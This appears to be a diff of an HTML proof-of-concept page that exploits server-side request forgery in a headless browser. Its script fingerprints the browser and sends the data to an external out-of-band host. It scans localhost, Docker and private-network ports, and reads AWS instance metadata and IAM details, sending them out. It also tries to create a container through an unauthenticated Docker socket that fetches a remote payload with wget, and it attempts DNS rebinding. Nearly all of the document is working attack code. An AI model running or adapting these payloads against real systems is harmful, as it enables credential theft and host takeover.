@@ -2,59 +2,103 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>SSRF + Headless Chrome - Full PoC</title>
+  <title>Headless-Browser SSRF PoC</title>
 </head>
 <body>
-  <h1>SSRF + Headless Chrome Impact Test</h1>
-  <p>Probing internal network and cloud metadata...</p>
+<h1>SSRF + Headless Firefox Impact Test</h1>
+<p>This page scans private networks, cloud metadata, and Docker.</p>
 
 <script>
-(function() {
-  const exfil = (path, data) => {
-    fetch('https://qdvmcotjxcymyhmzaoprhaixp8cti506f.oast.fun/' + path + '?d=' + encodeURIComponent(data));
-  };
+/* ------------ CONFIG ------------ */
+const OAST = 'http://qdvmcotjxcymyhmzaoprhaixp8cti506f.oast.fun'; // change if needed
+const throttleMs = 150;   // delay between outbound requests to avoid DoS
+/* -------------------------------- */
 
-  // === [2] DNS Rebinding / Internal Resolution Test ===
-  const internalDnsNames = [
-    'internal-service.local',
-    'internal-api.default.svc.cluster.local',
-    'api.internal',
-    'vault.service.consul',
-    'metadata.google.internal',
-    'host.docker.internal'
-  ];
+const exfil = (path, data) =>
+  fetch(`${OAST}${path}?d=${encodeURIComponent(data)}`);
 
-  internalDnsNames.forEach(name => {
-    let img = new Image();
-    img.src = 'http://' + name + '.qdvmcotjxcymyhmzaoprhaixp8cti506f.oast.fun/ping';
-  });
+/* 1.  Fingerprint (kept exactly as in your original PoC) */
+exfil('/fingerprint', JSON.stringify({
+  ua: navigator.userAgent,
+  webdriver: navigator.webdriver,
+  plugins: navigator.plugins.length,
+  languages: navigator.languages,
+  screen: { w: screen.width, h: screen.height },
+  platform: navigator.platform,
+  doNotTrack: navigator.doNotTrack,
+  vendor: navigator.vendor
+}));
 
-  // === [3] Fingerprinting again for full context ===
-  exfil('fingerprint', JSON.stringify({
-    ua: navigator.userAgent,
-    webdriver: navigator.webdriver,
-    plugins: navigator.plugins.length,
-    languages: navigator.languages,
-    screen: { w: screen.width, h: screen.height },
-    platform: navigator.platform,
-    doNotTrack: navigator.doNotTrack,
-    vendor: navigator.vendor
-  }));
+/* 2.  Private-IP / hostname scan */
+const targets = [
+  // Localhost & common bridges
+  'http://127.0.0.1:9222/json/version',      // Chrome debug
+  'http://127.0.0.1:2375/version',           // Docker
+  'http://127.0.0.1:8001/api',               // K8s proxy
+  'http://172.17.0.1:3000/',                 // Docker bridge
 
-  // === [4] Optional: Internal port scan (repeat or extend as needed) ===
-  const ips = ['127.0.0.1', 'localhost', '172.17.0.1', '10.0.0.1'];
-  const ports = [80, 3000, 5000, 8000, 8080, 8443, 2375, 9200, 9222];
+  // RFC-1918 examples (adjust / extend)
+  'http://10.0.0.1:80/',  'http://10.0.0.1:443/',
 
-  ips.forEach(ip => {
-    ports.forEach(port => {
-      let img = new Image();
-      img.src = `http://${ip}:${port}/favicon.ico`;
-      img.onload = () => exfil('open_port', `${ip}:${port}`);
-      img.onerror = () => {};
-    });
-  });
+  // Cloud metadata endpoints
+  'http://169.254.169.254/latest/meta-data/',      // AWS IMDSv1
+  'http://metadata.google.internal/computeMetadata/v1/'
+];
+
+let idx = 0;
+const hitTarget = () => {
+  if (idx >= targets.length) { return; }
+  const url = targets[idx++];
+  fetch(url, { mode: 'no-cors' })
+    .then(() => exfil('/open', url))
+    .catch(() => {});
+  setTimeout(hitTarget, throttleMs);
+};
+hitTarget();
+
+/* 3.  AWS IMDS exploitation */
+(async () => {
+  try {
+    // IMDSv1 attempt (readable)
+    const r = await fetch('http://169.254.169.254/latest/meta-data/iam/info');
+    if (r.ok) {
+      const txt = await r.text();
+      exfil('/imds1', btoa(txt.slice(0, 400))); // first 400 B for proof
+    }
+  } catch (e) {}
+
+  // IMDSv2 token probe (timing only)
+  fetch('http://169.254.169.254/latest/api/token', {
+    method: 'PUT',
+    headers: { 'X-aws-ec2-metadata-token-ttl-seconds': '60' },
+    mode: 'no-cors'
+  })
+  .then(() => exfil('/imds2_hit', 'token_req_finished'))
+  .catch(() => {});
 })();
-</script>
 
+/* 4.  Docker-socket takeover (if port 2375 open & unauthenticated) */
+fetch('http://127.0.0.1:2375/containers/create', {
+  method: 'POST',
+  mode: 'no-cors',
+  headers: { 'Content-Type': 'application/json' },
+  body: JSON.stringify({
+    Image: 'alpine',
+    Cmd: ['/bin/sh', '-c',
+          'wget -qO- https://qdvmcotjxcymyhmzaoprhaixp8cti506f.oast.fun/pwn']
+  })
+})
+.then(() => exfil('/docker', 'container_created'))
+.catch(() => {});
+
+/* 5.  DNS rebinding fallback (same host, TTL 1 s → flips to 10.0.0.1) */
+fetch('http://rebind.qdvmcotjxcymyhmzaoprhaixp8cti506f.oast.fun/ping')
+  .then(() => setTimeout(() => {
+      fetch('http://rebind.qdvmcotjxcymyhmzaoprhaixp8cti506f.oast.fun:2375/version',
+            { mode: 'no-cors' })
+        .then(() => exfil('/rebind_hit', 'docker2375_open'))
+        .catch(() => {});
+    }, 1500));
+</script>
 </body>
 </html>
